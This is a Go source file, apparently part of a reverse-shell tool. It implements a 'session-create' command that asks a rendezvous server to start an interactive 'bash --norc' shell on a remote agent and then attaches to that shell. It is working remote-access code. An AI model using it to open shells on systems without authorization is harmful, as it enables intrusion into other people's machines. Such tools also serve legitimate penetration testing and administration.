package cmd

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/maxlaverse/reverse-shell/rendezvous/api"
	"github.com/spf13/cobra"
)

// NewCreateCommand creates a new cobra.Command for `reverse-shell-master rendezvous session-create`
func NewCreateCommand(agent Cli) *cobra.Command {
	var url string
	cmd := &cobra.Command{
		Use:              "session-create",
		Short:            "create a new session on a given agent",
		TraverseChildren: true,
		Run: func(cmd *cobra.Command, args []string) {
			sessionId := createSession(url, args[0])
			AttachSession(url, sessionId)
		},
	}

	cmd.Flags().StringVarP(&url, "url", "", "", "Url of the rendez-vous point")

	return cmd
}

func createSession(url string, agent string) string {
	m := api.CreateSession{
		Agent:   agent,
		Command: "bash --norc",
	}
	b, _ := json.Marshal(m)
	client := &http.Client{}
	req, _ := http.NewRequest("PUT", url+"/session/create", bytes.NewReader(b))
	resp, _ := client.Do(req)

	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Printf(string(body))
	return string(body)
}
